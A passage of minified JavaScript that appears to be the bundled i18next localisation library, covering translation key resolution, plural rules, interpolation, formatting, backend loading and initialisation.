de=this.pluralResolver.getSuffixes(J,i);M&&i[`defaultValue${this.options.pluralSeparator}zero`]&&de.indexOf(`${this.options.pluralSeparator}zero`)<0&&de.push(`${this.options.pluralSeparator}zero`),de.forEach(B=>{G([J],u+B,i[`defaultValue${B}`]||N)})}):G(Ee,u,N))}A=this.extendTranslation(A,e,i,C,n),ce&&A===u&&this.options.appendNamespaceToMissingKey&&(A=`${p}${f}${u}`),(ce||F)&&this.options.parseMissingKeyHandler&&(A=this.options.parseMissingKeyHandler(this.options.appendNamespaceToMissingKey?`${p}${f}${u}`:u,F?A:void 0,i))}return r?(C.res=A,C.usedParams=this.getUsedParamsDetails(i),C):A}extendTranslation(e,t,n,i,r){if(this.i18nFormat?.parse)e=this.i18nFormat.parse(e,{...this.options.interpolation.defaultVariables,...n},n.lng||this.language||i.usedLng,i.usedNS,i.usedKey,{resolved:i});else if(!n.skipInterpolation){n.interpolation&&this.interpolator.init({...n,interpolation:{...this.options.interpolation,...n.interpolation}});const d=Je(e)&&(n?.interpolation?.skipOnVariables!==void 0?n.interpolation.skipOnVariables:this.options.interpolation.skipOnVariables);let p;if(d){const h=e.match(this.interpolator.nestingRegexp);p=h&&h.length}let f=n.replace&&!Je(n.replace)?n.replace:n;if(this.options.interpolation.defaultVariables&&(f={...this.options.interpolation.defaultVariables,...f}),e=this.interpolator.interpolate(e,f,n.lng||this.language||i.usedLng,n),d){const h=e.match(this.interpolator.nestingRegexp),E=h&&h.length;p<E&&(n.nest=!1)}!n.lng&&i&&i.res&&(n.lng=this.language||i.usedLng),n.nest!==!1&&(e=this.interpolator.nest(e,(...h)=>r?.[0]===h[0]&&!n.context?(this.logger.warn(`It seems you are nesting recursively key: ${h[0]} in key: ${t[0]}`),null):this.translate(...h,t),n)),n.interpolation&&this.interpolator.reset()}const l=n.postProcess||this.options.postProcess,u=Je(l)?[l]:l;return e!=null&&u?.length&&n.applyPostProcessor!==!1&&(e=XR.handle(u,e,t,this.options&&this.options.postProcessPassResolved?{i18nResolved:{...i,usedParams:this.getUsedParamsDetails(n)},...n}:n,this)),e}resolve(e,t={}){let n,i,r,l,u;return Je(e)&&(e=[e]),e.forEach(d=>{if(this.isValidLookup(n))return;const p=this.extractFromKey(d,t),f=p.key;i=f;let h=p.namespaces;this.options.fallbackNS&&(h=h.concat(this.options.fallbackNS));const E=t.count!==void 0&&!Je(t.count),C=E&&!t.ordinal&&t.count===0,A=t.context!==void 0&&(Je(t.context)||typeof t.context=="number")&&t.context!=="",j=t.lngs?t.lngs:this.languageUtils.toResolveHierarchy(t.lng||this.language,t.fallbackLng);h.forEach(R=>{this.isValidLookup(n)||(u=R,!fA[`${j[0]}-${R}`]&&this.utils?.hasLoadedNamespace&&!this.utils?.hasLoadedNamespace(u)&&(fA[`${j[0]}-${R}`]=!0,this.logger.warn(`key "${i}" for languages "${j.join(", ")}" won't get resolved as namespace "${u}" was not yet loaded`,"This means something IS WRONG in your setup. You access the t function before i18next.init / i18next.loadNamespace / i18next.changeLanguage was done. Wait for the callback or Promise to resolve before accessing it!!!")),j.forEach(I=>{if(this.isValidLookup(n))return;l=I;const w=[f];if(this.i18nFormat?.addLookupKeys)this.i18nFormat.addLookupKeys(w,f,I,R,t);else{let Y;E&&(Y=this.pluralResolver.getSuffix(I,t.count,t));const ee=`${this.options.pluralSeparator}zero`,Q=`${this.options.pluralSeparator}ordinal${this.options.pluralSeparator}`;if(E&&(t.ordinal&&Y.indexOf(Q)===0&&w.push(f+Y.replace(Q,this.options.pluralSeparator)),w.push(f+Y),C&&w.push(f+ee)),A){const q=`${f}${this.options.contextSeparator||"_"}${t.context}`;w.push(q),E&&(t.ordinal&&Y.indexOf(Q)===0&&w.push(q+Y.replace(Q,this.options.pluralSeparator)),w.push(q+Y),C&&w.push(q+ee))}}let k;for(;k=w.pop();)this.isValidLookup(n)||(r=k,n=this.getResource(I,R,k,t))}))})}),{res:n,usedKey:i,exactUsedKey:r,usedLng:l,usedNS:u}}isValidLookup(e){return e!==void 0&&!(!this.options.returnNull&&e===null)&&!(!this.options.returnEmptyString&&e==="")}getResource(e,t,n,i={}){return this.i18nFormat?.getResource?this.i18nFormat.getResource(e,t,n,i):this.resourceStore.getResource(e,t,n,i)}getUsedParamsDetails(e={}){const t=["defaultValue","ordinal","context","replace","lng","lngs","fallbackLng","ns","keySeparator","nsSeparator","returnObjects","returnDetails","joinArrays","postProcess","interpolation"],n=e.replace&&!Je(e.replace);let i=n?e.replace:e;if(n&&typeof e.count<"u"&&(i.count=e.count),this.options.interpolation.defaultVariables&&(i={...this.options.interpolation.defaultVariables,...i}),!n){i={...i};for(const r of t)delete i[r]}return i}static hasDefaultValue(e){const t="defaultValue";for(const n in e)if(Object.prototype.hasOwnProperty.call(e,n)&&t===n.substring(0,t.length)&&e[n]!==void 0)return!0;return!1}}class hA{constructor(e){this.options=e,this.supportedLngs=this.options.supportedLngs||!1,this.logger=to.create("languageUtils")}getScriptPartFromCode(e){if(e=Kd(e),!e||e.indexOf("-")<0)return null;const t=e.split("-");return t.length===2||(t.pop(),t[t.length-1].toLowerCase()==="x")?null:this.formatLanguageCode(t.join("-"))}getLanguagePartFromCode(e){if(e=Kd(e),!e||e.indexOf("-")<0)return e;const t=e.split("-");return this.formatLanguageCode(t[0])}formatLanguageCode(e){if(Je(e)&&e.indexOf("-")>-1){let t;try{t=Intl.getCanonicalLocales(e)[0]}catch{}return t&&this.options.lowerCaseLng&&(t=t.toLowerCase()),t||(this.options.lowerCaseLng?e.toLowerCase():e)}return this.options.cleanCode||this.options.lowerCaseLng?e.toLowerCase():e}isSupportedCode(e){return(this.options.load==="languageOnly"||this.options.nonExplicitSupportedLngs)&&(e=this.getLanguagePartFromCode(e)),!this.supportedLngs||!this.supportedLngs.length||this.supportedLngs.indexOf(e)>-1}getBestMatchFromCodes(e){if(!e)return null;let t;return e.forEach(n=>{if(t)return;const i=this.formatLanguageCode(n);(!this.options.supportedLngs||this.isSupportedCode(i))&&(t=i)}),!t&&this.options.supportedLngs&&e.forEach(n=>{if(t)return;const i=this.getScriptPartFromCode(n);if(this.isSupportedCode(i))return t=i;const r=this.getLanguagePartFromCode(n);if(this.isSupportedCode(r))return t=r;t=this.options.supportedLngs.find(l=>{if(l===r)return l;if(!(l.indexOf("-")<0&&r.indexOf("-")<0)&&(l.indexOf("-")>0&&r.indexOf("-")<0&&l.substring(0,l.indexOf("-"))===r||l.indexOf(r)===0&&r.length>1))return l})}),t||(t=this.getFallbackCodes(this.options.fallbackLng)[0]),t}getFallbackCodes(e,t){if(!e)return[];if(typeof e=="function"&&(e=e(t)),Je(e)&&(e=[e]),Array.isArray(e))return e;if(!t)return e.default||[];let n=e[t];return n||(n=e[this.getScriptPartFromCode(t)]),n||(n=e[this.formatLanguageCode(t)]),n||(n=e[this.getLanguagePartFromCode(t)]),n||(n=e.default),n||[]}toResolveHierarchy(e,t){const n=this.getFallbackCodes((t===!1?[]:t)||this.options.fallbackLng||[],e),i=[],r=l=>{l&&(this.isSupportedCode(l)?i.push(l):this.logger.warn(`rejecting language code not found in supportedLngs: ${l}`))};return Je(e)&&(e.indexOf("-")>-1||e.indexOf("_")>-1)?(this.options.load!=="languageOnly"&&r(this.formatLanguageCode(e)),this.options.load!=="languageOnly"&&this.options.load!=="currentOnly"&&r(this.getScriptPartFromCode(e)),this.options.load!=="currentOnly"&&r(this.getLanguagePartFromCode(e))):Je(e)&&r(this.formatLanguageCode(e)),n.forEach(l=>{i.indexOf(l)<0&&r(this.formatLanguageCode(l))}),i}}const gA={zero:0,one:1,two:2,few:3,many:4,other:5},bA={select:a=>a===1?"one":"other",resolvedOptions:()=>({pluralCategories:["one","other"]})};class y3{constructor(e,t={}){this.languageUtils=e,this.options=t,this.logger=to.create("pluralResolver"),this.pluralRulesCache={}}clearCache(){this.pluralRulesCache={}}getRule(e,t={}){const n=Kd(e==="dev"?"en":e),i=t.ordinal?"ordinal":"cardinal",r=JSON.stringify({cleanedCode:n,type:i});if(r in this.pluralRulesCache)return this.pluralRulesCache[r];let l;try{l=new Intl.PluralRules(n,{type:i})}catch{if(typeof Intl>"u")return this.logger.error("No Intl support, please use an Intl polyfill!"),bA;if(!e.match(/-|_/))return bA;const d=this.languageUtils.getLanguagePartFromCode(e);l=this.getRule(d,t)}return this.pluralRulesCache[r]=l,l}needsPlural(e,t={}){let n=this.getRule(e,t);return n||(n=this.getRule("dev",t)),n?.resolvedOptions().pluralCategories.length>1}getPluralFormsOfKey(e,t,n={}){return this.getSuffixes(e,n).map(i=>`${t}${i}`)}getSuffixes(e,t={}){let n=this.getRule(e,t);return n||(n=this.getRule("dev",t)),n?n.resolvedOptions().pluralCategories.sort((i,r)=>gA[i]-gA[r]).map(i=>`${this.options.prepend}${t.ordinal?`ordinal${this.options.prepend}`:""}${i}`):[]}getSuffix(e,t,n={}){const i=this.getRule(e,n);return i?`${this.options.prepend}${n.ordinal?`ordinal${this.options.prepend}`:""}${i.select(t)}`:(this.logger.warn(`no plural rule found for: ${e}`),this.getSuffix("dev",t,n))}}const vA=(a,e,t,n=".",i=!0)=>{let r=c3(a,e,t);return!r&&i&&Je(t)&&(r=zy(a,t,n),r===void 0&&(r=zy(e,t,n))),r},Nv=a=>a.replace(/\$/g,"$$$$");class yA{constructor(e={}){this.logger=to.create("interpolator"),this.options=e,this.format=e?.interpolation?.format||(t=>t),this.init(e)}init(e={}){e.interpolation||(e.interpolation={escapeValue:!0});const{escape:t,escapeValue:n,useRawValueToEscape:i,prefix:r,prefixEscaped:l,suffix:u,suffixEscaped:d,formatSeparator:p,unescapeSuffix:f,unescapePrefix:h,nestingPrefix:E,nestingPrefixEscaped:C,nestingSuffix:A,nestingSuffixEscaped:j,nestingOptionsSeparator:R,maxReplaces:I,alwaysFormat:w}=e.interpolation;this.escape=t!==void 0?t:d3,this.escapeValue=n!==void 0?n:!0,this.useRawValueToEscape=i!==void 0?i:!1,this.prefix=r?Ur(r):l||"{{",this.suffix=u?Ur(u):d||"}}",this.formatSeparator=p||",",this.unescapePrefix=f?"":h||"-",this.unescapeSuffix=this.unescapePrefix?"":f||"",this.nestingPrefix=E?Ur(E):C||Ur("$t("),this.nestingSuffix=A?Ur(A):j||Ur(")"),this.nestingOptionsSeparator=R||",",this.maxReplaces=I||1e3,this.alwaysFormat=w!==void 0?w:!1,this.resetRegExp()}reset(){this.options&&this.init(this.options)}resetRegExp(){const e=(t,n)=>t?.source===n?(t.lastIndex=0,t):new RegExp(n,"g");this.regexp=e(this.regexp,`${this.prefix}(.+?)${this.suffix}`),this.regexpUnescape=e(this.regexpUnescape,`${this.prefix}${this.unescapePrefix}(.+?)${this.unescapeSuffix}${this.suffix}`),this.nestingRegexp=e(this.nestingRegexp,`${this.nestingPrefix}((?:[^()"']+|"[^"]*"|'[^']*'|\\((?:[^()]|"[^"]*"|'[^']*')*\\))*?)${this.nestingSuffix}`)}interpolate(e,t,n,i){let r,l,u;const d=this.options&&this.options.interpolation&&this.options.interpolation.defaultVariables||{},p=C=>{if(C.indexOf(this.formatSeparator)<0){const I=vA(t,d,C,this.options.keySeparator,this.options.ignoreJSONStructure);return this.alwaysFormat?this.format(I,void 0,n,{...i,...t,interpolationkey:C}):I}const A=C.split(this.formatSeparator),j=A.shift().trim(),R=A.join(this.formatSeparator).trim();return this.format(vA(t,d,j,this.options.keySeparator,this.options.ignoreJSONStructure),R,n,{...i,...t,interpolationkey:j})};this.resetRegExp();const f=i?.missingInterpolationHandler||this.options.missingInterpolationHandler,h=i?.interpolation?.skipOnVariables!==void 0?i.interpolation.skipOnVariables:this.options.interpolation.skipOnVariables;return[{regex:this.regexpUnescape,safeValue:C=>Nv(C)},{regex:this.regexp,safeValue:C=>this.escapeValue?Nv(this.escape(C)):Nv(C)}].forEach(C=>{for(u=0;r=C.regex.exec(e);){const A=r[1].trim();if(l=p(A),l===void 0)if(typeof f=="function"){const R=f(e,r,i);l=Je(R)?R:""}else if(i&&Object.prototype.hasOwnProperty.call(i,A))l="";else if(h){l=r[0];continue}else this.logger.warn(`missed to pass in variable ${A} for interpolating ${e}`),l="";else!Je(l)&&!this.useRawValueToEscape&&(l=cA(l));const j=C.safeValue(l);if(e=e.replace(r[0],j),h?(C.regex.lastIndex+=l.length,C.regex.lastIndex-=r[0].length):C.regex.lastIndex=0,u++,u>=this.maxReplaces)break}}),e}nest(e,t,n={}){let i,r,l;const u=(d,p)=>{const f=this.nestingOptionsSeparator;if(d.indexOf(f)<0)return d;const h=d.split(new RegExp(`${Ur(f)}[ ]*{`));let E=`{${h[1]}`;d=h[0],E=this.interpolate(E,l);const C=E.match(/'/g),A=E.match(/"/g);((C?.length??0)%2===0&&!A||(A?.length??0)%2!==0)&&(E=E.replace(/'/g,'"'));try{l=JSON.parse(E),p&&(l={...p,...l})}catch(j){return this.logger.warn(`failed parsing options string in nesting for key ${d}`,j),`${d}${f}${E}`}return l.defaultValue&&l.defaultValue.indexOf(this.prefix)>-1&&delete l.defaultValue,d};for(;i=this.nestingRegexp.exec(e);){let d=[];l={...n},l=l.replace&&!Je(l.replace)?l.replace:l,l.applyPostProcessor=!1,delete l.defaultValue;const p=/{.*}/.test(i[1])?i[1].lastIndexOf("}")+1:i[1].indexOf(this.formatSeparator);if(p!==-1&&(d=i[1].slice(p).split(this.formatSeparator).map(f=>f.trim()).filter(Boolean),i[1]=i[1].slice(0,p)),r=t(u.call(this,i[1].trim(),l),l),r&&i[0]===e&&!Je(r))return r;Je(r)||(r=cA(r)),r||(this.logger.warn(`missed to resolve ${i[1]} for nesting ${e}`),r=""),d.length&&(r=d.reduce((f,h)=>this.format(f,h,n.lng,{...n,interpolationkey:i[1].trim()}),r.trim())),e=e.replace(i[0],r),this.regexp.lastIndex=0}return e}}const E3=a=>{let e=a.toLowerCase().trim();const t={};if(a.indexOf("(")>-1){const n=a.split("(");e=n[0].toLowerCase().trim();const i=n[1].substring(0,n[1].length-1);e==="currency"&&i.indexOf(":")<0?t.currency||(t.currency=i.trim()):e==="relativetime"&&i.indexOf(":")<0?t.range||(t.range=i.trim()):i.split(";").forEach(l=>{if(l){const[u,...d]=l.split(":"),p=d.join(":").trim().replace(/^'+|'+$/g,""),f=u.trim();t[f]||(t[f]=p),p==="false"&&(t[f]=!1),p==="true"&&(t[f]=!0),isNaN(p)||(t[f]=parseInt(p,10))}})}return{formatName:e,formatOptions:t}},EA=a=>{const e={};return(t,n,i)=>{let r=i;i&&i.interpolationkey&&i.formatParams&&i.formatParams[i.interpolationkey]&&i[i.interpolationkey]&&(r={...r,[i.interpolationkey]:void 0});const l=n+JSON.stringify(r);let u=e[l];return u||(u=a(Kd(n),i),e[l]=u),u(t)}},S3=a=>(e,t,n)=>a(Kd(t),n)(e);class C3{constructor(e={}){this.logger=to.create("formatter"),this.options=e,this.init(e)}init(e,t={interpolation:{}}){this.formatSeparator=t.interpolation.formatSeparator||",";const n=t.cacheInBuiltFormats?EA:S3;this.formats={number:n((i,r)=>{const l=new Intl.NumberFormat(i,{...r});return u=>l.format(u)}),currency:n((i,r)=>{const l=new Intl.NumberFormat(i,{...r,style:"currency"});return u=>l.format(u)}),datetime:n((i,r)=>{const l=new Intl.DateTimeFormat(i,{...r});return u=>l.format(u)}),relativetime:n((i,r)=>{const l=new Intl.RelativeTimeFormat(i,{...r});return u=>l.format(u,r.range||"day")}),list:n((i,r)=>{const l=new Intl.ListFormat(i,{...r});return u=>l.format(u)})}}add(e,t){this.formats[e.toLowerCase().trim()]=t}addCached(e,t){this.formats[e.toLowerCase().trim()]=EA(t)}format(e,t,n,i={}){const r=t.split(this.formatSeparator);if(r.length>1&&r[0].indexOf("(")>1&&r[0].indexOf(")")<0&&r.find(u=>u.indexOf(")")>-1)){const u=r.findIndex(d=>d.indexOf(")")>-1);r[0]=[r[0],...r.splice(1,u)].join(this.formatSeparator)}return r.reduce((u,d)=>{const{formatName:p,formatOptions:f}=E3(d);if(this.formats[p]){let h=u;try{const E=i?.formatParams?.[i.interpolationkey]||{},C=E.locale||E.lng||i.locale||i.lng||n;h=this.formats[p](u,C,{...f,...i,...E})}catch(E){this.logger.warn(E)}return h}else this.logger.warn(`there was no format function for ${p}`);return u},e)}}const T3=(a,e)=>{a.pending[e]!==void 0&&(delete a.pending[e],a.pendingCount--)};class x3 extends Gh{constructor(e,t,n,i={}){super(),this.backend=e,this.store=t,this.services=n,this.languageUtils=n.languageUtils,this.options=i,this.logger=to.create("backendConnector"),this.waitingReads=[],this.maxParallelReads=i.maxParallelReads||10,this.readingCalls=0,this.maxRetries=i.maxRetries>=0?i.maxRetries:5,this.retryTimeout=i.retryTimeout>=1?i.retryTimeout:350,this.state={},this.queue=[],this.backend?.init?.(n,i.backend,i)}queueLoad(e,t,n,i){const r={},l={},u={},d={};return e.forEach(p=>{let f=!0;t.forEach(h=>{const E=`${p}|${h}`;!n.reload&&this.store.hasResourceBundle(p,h)?this.state[E]=2:this.state[E]<0||(this.state[E]===1?l[E]===void 0&&(l[E]=!0):(this.state[E]=1,f=!1,l[E]===void 0&&(l[E]=!0),r[E]===void 0&&(r[E]=!0),d[h]===void 0&&(d[h]=!0)))}),f||(u[p]=!0)}),(Object.keys(r).length||Object.keys(l).length)&&this.queue.push({pending:l,pendingCount:Object.keys(l).length,loaded:{},errors:[],callback:i}),{toLoad:Object.keys(r),pending:Object.keys(l),toLoadLanguages:Object.keys(u),toLoadNamespaces:Object.keys(d)}}loaded(e,t,n){const i=e.split("|"),r=i[0],l=i[1];t&&this.emit("failedLoading",r,l,t),!t&&n&&this.store.addResourceBundle(r,l,n,void 0,void 0,{skipCopy:!0}),this.state[e]=t?-1:2,t&&n&&(this.state[e]=0);const u={};this.queue.forEach(d=>{l3(d.loaded,[r],l),T3(d,e),t&&d.errors.push(t),d.pendingCount===0&&!d.done&&(Object.keys(d.loaded).forEach(p=>{u[p]||(u[p]={});const f=d.loaded[p];f.length&&f.forEach(h=>{u[p][h]===void 0&&(u[p][h]=!0)})}),d.done=!0,d.errors.length?d.callback(d.errors):d.callback())}),this.emit("loaded",u),this.queue=this.queue.filter(d=>!d.done)}read(e,t,n,i=0,r=this.retryTimeout,l){if(!e.length)return l(null,{});if(this.readingCalls>=this.maxParallelReads){this.waitingReads.push({lng:e,ns:t,fcName:n,tried:i,wait:r,callback:l});return}this.readingCalls++;const u=(p,f)=>{if(this.readingCalls--,this.waitingReads.length>0){const h=this.waitingReads.shift();this.read(h.lng,h.ns,h.fcName,h.tried,h.wait,h.callback)}if(p&&f&&i<this.maxRetries){setTimeout(()=>{this.read.call(this,e,t,n,i+1,r*2,l)},r);return}l(p,f)},d=this.backend[n].bind(this.backend);if(d.length===2){try{const p=d(e,t);p&&typeof p.then=="function"?p.then(f=>u(null,f)).catch(u):u(null,p)}catch(p){u(p)}return}return d(e,t,u)}prepareLoading(e,t,n={},i){if(!this.backend)return this.logger.warn("No backend was added via i18next.use. Will not load resources."),i&&i();Je(e)&&(e=this.languageUtils.toResolveHierarchy(e)),Je(t)&&(t=[t]);const r=this.queueLoad(e,t,n,i);if(!r.toLoad.length)return r.pending.length||i(),null;r.toLoad.forEach(l=>{this.loadOne(l)})}load(e,t,n){this.prepareLoading(e,t,{},n)}reload(e,t,n){this.prepareLoading(e,t,{reload:!0},n)}loadOne(e,t=""){const n=e.split("|"),i=n[0],r=n[1];this.read(i,r,"read",void 0,void 0,(l,u)=>{l&&this.logger.warn(`${t}loading namespace ${r} for language ${i} failed`,l),!l&&u&&this.logger.log(`${t}loaded namespace ${r} for language ${i}`,u),this.loaded(e,l,u)})}saveMissing(e,t,n,i,r,l={},u=()=>{}){if(this.services?.utils?.hasLoadedNamespace&&!this.services?.utils?.hasLoadedNamespace(t)){this.logger.warn(`did not save key "${n}" as the namespace "${t}" was not yet loaded`,"This means something IS WRONG in your setup. You access the t function before i18next.init / i18next.loadNamespace / i18next.changeLanguage was done. Wait for the callback or Promise to resolve before accessing it!!!");return}if(!(n==null||n==="")){if(this.backend?.create){const d={...l,isUpdate:r},p=this.backend.create.bind(this.backend);if(p.length<6)try{let f;p.length===5?f=p(e,t,n,i,d):f=p(e,t,n,i),f&&typeof f.then=="function"?f.then(h=>u(null,h)).catch(u):u(null,f)}catch(f){u(f)}else p(e,t,n,i,u,d)}!e||!e[0]||this.store.addResource(e[0],t,n,i)}}}const _v=()=>({debug:!1,initAsync:!0,ns:["translation"],defaultNS:["translation"],fallbackLng:["dev"],fallbackNS:!1,supportedLngs:!1,nonExplicitSupportedLngs:!1,load:"all",preload:!1,simplifyPluralSuffix:!0,keySeparator:".",nsSeparator:":",pluralSeparator:"_",contextSeparator:"_",partialBundledLanguages:!1,saveMissing:!1,updateMissing:!1,saveMissingTo:"fallback",saveMissingPlurals:!0,missingKeyHandler:!1,missingInterpolationHandler:!1,postProcess:!1,postProcessPassResolved:!1,returnNull:!1,returnEmptyString:!0,returnObjects:!1,joinArrays:!1,returnedObjectHandler:!1,parseMissingKeyHandler:!1,appendNamespaceToMissingKey:!1,appendNamespaceToCIMode:!1,overloadTranslationOptionHandler:a=>{let e={};if(typeof a[1]=="object"&&(e=a[1]),Je(a[1])&&(e.defaultValue=a[1]),Je(a[2])&&(e.tDescription=a[2]),typeof a[2]=="object"||typeof a[3]=="object"){const t=a[3]||a[2];Object.keys(t).forEach(n=>{e[n]=t[n]})}return e},interpolation:{escapeValue:!0,format:a=>a,prefix:"{{",suffix:"}}",formatSeparator:",",unescapePrefix:"-",nestingPrefix:"$t(",nestingSuffix:")",nestingOptionsSeparator:",",maxReplaces:1e3,skipOnVariables:!0},cacheInBuiltFormats:!0}),SA=a=>(Je(a.ns)&&(a.ns=[a.ns]),Je(a.fallbackLng)&&(a.fallbackLng=[a.fallbackLng]),Je(a.fallbackNS)&&(a.fallbackNS=[a.fallbackNS]),a.supportedLngs?.indexOf?.("cimode")<0&&(a.supportedLngs=a.supportedLngs.concat(["cimode"])),typeof a.initImmediate=="boolean"&&(a.initAsync=a.initImmediate),a),ff=()=>{},A3=a=>{Object.getOwnPropertyNames(Object.getPrototypeOf(a)).forEach(t=>{typeof a[t]=="function"&&(a[t]=a[t].bind(a))})},eI="__i18next_supportNoticeShown",P3=()=>typeof globalThis<"u"&&!!globalThis[eI],L3=()=>{typeof globalThis<"u"&&(globalThis[eI]=!0)},R3=a=>!!(a?.modules?.backend?.name?.indexOf("Locize")>0||a?.modules?.backend?.constructor?.name?.indexOf("Locize")>0||a?.options?.backend?.backends&&a.options.backend.backends.some(e=>e?.name?.indexOf("Locize")>0||e?.constructor?.name?.indexOf("Locize")>0));class Id extends Gh{constructor(e={},t){if(super(),this.options=SA(e),this.services={},this.logger=to,this.modules={external:[]},A3(this),t&&!this.isInitialized&&!e.isClone){if(!this.options.initAsync)return this.init(e,t),this;setTimeout(()=>{this.init(e,t)},0)}}init(e={},t){this.isInitializing=!0,typeof e=="function"&&(t=e,e={}),e.defaultNS==null&&e.ns&&(Je(e.ns)?e.defaultNS=e.ns:e.ns.indexOf("translation")<0&&(e.defaultNS=e.ns[0]));const n=_v();this.options={...n,...this.options,...SA(e)},this.options.interpolation={...n.interpolation,...this.options.interpolation},e.keySeparator!==void 0&&(this.options.userDefinedKeySeparator=e.keySeparator),e.nsSeparator!==void 0&&(this.options.userDefinedNsSeparator=e.nsSeparator),typeof this.options.overloadTranslationOptionHandler!="function"&&(this.options.overloadTranslationOptionHandler=n.overloadTranslationOptionHandler),this.options.showSupportNotice!==!1&&!R3(this)&&!P3()&&(typeof console<"u"&&typeof console.info<"u"&&console.info(" i18next is maintained with support from Locize  consider powering your project with managed localization (AI, CDN, integrations): https://locize.com "),L3());const i=p=>p?typeof p=="function"?new p:p:null;if(!this.options.isClone){this.modules.logger?to.init(i(this.modules.logger),this.options):to.init(null,this.options);let p;this.modules.formatter?p=this.modules.formatter:p=C3;const f=new hA(this.options);this.store=new mA(this.options.resources,this.options);const h=this.services;h.logger=to,h.resourceStore=this.store,h.languageUtils=f,h.pluralResolver=new y3(f,{prepend:this.options.pluralSeparator,simplifyPluralSuffix:this.options.simplifyPluralSuffix}),this.options.interpolation.format&&this.options.interpolation.format!==n.interpolation.format&&this.logger.deprecate("init: you are still using the legacy format function, please use the new approach: https://www.i18next.com/translation-function/formatting"),p&&(!this.options.interpolation.format||this.options.interpolation.format===n.interpolation.format)&&(h.formatter=i(p),h.formatter.init&&h.formatter.init(h,this.options),this.options.interpolation.format=h.formatter.format.bind(h.formatter)),h.interpolator=new yA(this.options),h.utils={hasLoadedNamespace:this.hasLoadedNamespace.bind(this)},h.backendConnector=new x3(i(this.modules.backend),h.resourceStore,h,this.options),h.backendConnector.on("*",(C,...A)=>{this.emit(C,...A)}),this.modules.languageDetector&&(h.languageDetector=i(this.modules.languageDetector),h.languageDetector.init&&h.languageDetector.init(h,this.options.detection,this.options)),this.modules.i18nFormat&&(h.i18nFormat=i(this.modules.i18nFormat),h.i18nFormat.init&&h.i18nFormat.init(this)),this.translator=new sh(this.services,this.options),this.translator.on("*",(C,...A)=>{this.emit(C,...A)}),this.modules.external.forEach(C=>{C.init&&C.init(this)})}if(this.format=this.options.interpolation.format,t||(t=ff),this.options.fallbackLng&&!this.services.languageDetector&&!this.options.lng){const p=this.services.languageUtils.getFallbackCodes(this.options.fallbackLng);p.length>0&&p[0]!=="dev"&&(this.options.lng=p[0])}!this.services.languageDetector&&!this.options.lng&&this.logger.warn("init: no languageDetector is used and no lng is defined"),["getResource","hasResourceBundle","getResourceBundle","getDataByLanguage"].forEach(p=>{this[p]=(...f)=>this.store[p](...f)}),["addResource","addResources","addResourceBundle","removeResourceBundle"].forEach(p=>{this[p]=(...f)=>(this.store[p](...f),this)});const u=sd(),d=()=>{const p=(f,h)=>{this.isInitializing=!1,this.isInitialized&&!this.initializedStoreOnce&&this.logger.warn("init: i18next is already initialized. You should call init just once!"),this.isInitialized=!0,this.options.isClone||this.logger.log("initialized",this.options),this.emit("initialized",this.options),u.resolve(h),t(f,h)};if(this.languages&&!this.isInitialized)return p(null,this.t.bind(this));this.changeLanguage(this.options.lng,p)};return this.options.resources||!this.options.initAsync?d():setTimeout(d,0),u}loadResources(e,t=ff){let n=t;const i=Je(e)?e:this.language;if(typeof e=="function"&&(n=e),!this.options.resources||this.options.partialBundledLanguages){if(i?.toLowerCase()==="cimode"&&(!this.options.preload||this.options.preload.length===0))return n();const r=[],l=u=>{if(!u||u==="cimode")return;this.services.languageUtils.toResolveHierarchy(u).forEach(p=>{p!=="cimode"&&r.indexOf(p)<0&&r.push(p)})};i?l(i):this.services.languageUtils.getFallbackCodes(this.options.fallbackLng).forEach(d=>l(d)),this.options.preload?.forEach?.(u=>l(u)),this.services.backendConnector.load(r,this.options.ns,u=>{!u&&!this.resolvedLanguage&&this.language&&this.setResolvedLanguage(this.language),n(u)})}else n(null)}reloadResources(e,t,n){const i=sd();return typeof e=="function"&&(n=e,e=void 0),typeof t=="function"&&(n=t,t=void 0),e||(e=this.languages),t||(t=this.options.ns),n||(n=ff),this.services.backendConnector.reload(e,t,r=>{i.resolve(),n(r)}),i}use(e){if(!e)throw new Error("You are passing an undefined module! Please check the object you are passing to i18next.use()");if(!e.type)throw new Error("You are passing a wrong module! Please check the object you are passing to i18next.use()");return e.type==="backend"&&(this.modules.backend=e),(e.type==="logger"||e.log&&e.warn&&e.error)&&(this.modules.logger=e),e.type==="languageDetector"&&(this.modules.languageDetector=e),e.type==="i18nFormat"&&(this.modules.i18nFormat=e),e.type==="postProcessor"&&XR.addPostProcessor(e),e.type==="formatter"&&(this.modules.formatter=e),e.type==="3rdParty"&&this.modules.external.push(e),this}setResolvedLanguage(e){if(!(!e||!this.languages)&&!(["cimode","dev"].indexOf(e)>-1)){for(let t=0;t<this.languages.length;t++){const n=this.languages[t];if(!(["cimode","dev"].indexOf(n)>-1)&&this.store.hasLanguageSomeTranslations(n)){this.resolvedLanguage=n;break}}!this.resolvedLanguage&&this.languages.indexOf(e)<0&&this.store.hasLanguageSomeTranslations(e)&&(this.resolvedLanguage=e,this.languages.unshift(e))}}changeLanguage(e,t){this.isLanguageChangingTo=e;const n=sd();this.emit("languageChanging",e);const i=u=>{this.language=u,this.languages=this.services.languageUtils.toResolveHierarchy(u),this.resolvedLanguage=void 0,this.setResolvedLanguage(u)},r=(u,d)=>{d?this.isLanguageChangingTo===e&&(i(d),this.translator.changeLanguage(d),this.isLanguageChangingTo=void 0,this.emit("languageChanged",d),this.logger.log("languageChanged",d)):this.isLanguageChangingTo=void 0,n.resolve((...p)=>this.t(...p)),t&&t(u,(...p)=>this.t(...p))},l=u=>{!e&&!u&&this.services.languageDetector&&(u=[]);const d=Je(u)?u:u&&u[0],p=this.store.hasLanguageSomeTranslations(d)?d:this.services.languageUtils.getBestMatchFromCodes(Je(u)?[u]:u);p&&(this.language||i(p),this.translator.language||this.translator.changeLanguage(p),this.services.languageDetector?.cacheUserLanguage?.(p)),this.loadResources(p,f=>{r(f,p)})};return!e&&this.services.languageDetector&&!this.services.languageDetector.async?l(this.services.languageDetector.detect()):!e&&this.services.languageDetector&&this.services.languageDetector.async?this.services.languageDetector.detect.length===0?this.services.languageDetector.detect().then(l):this.services.languageDetector.detect(l):l(e),n}getFixedT(e,t,n){const i=(r,l,...u)=>{let d;typeof l!="object"?d=this.options.overloadTranslationOptionHandler([r,l].concat(u)):d={...l},d.lng=d.lng||i.lng,d.lngs=d.lngs||i.lngs,d.ns=d.ns||i.ns,d.keyPrefix!==""&&(d.keyPrefix=d.keyPrefix||n||i.keyPrefix);const p=this.options.keySeparator||".";let f;return d.keyPrefix&&Array.isArray(r)?f=r.map(h=>(typeof h=="function"&&(h=Fy(h,{...this.options,...l})),`${d.keyPrefix}${p}${h}`)):(typeof 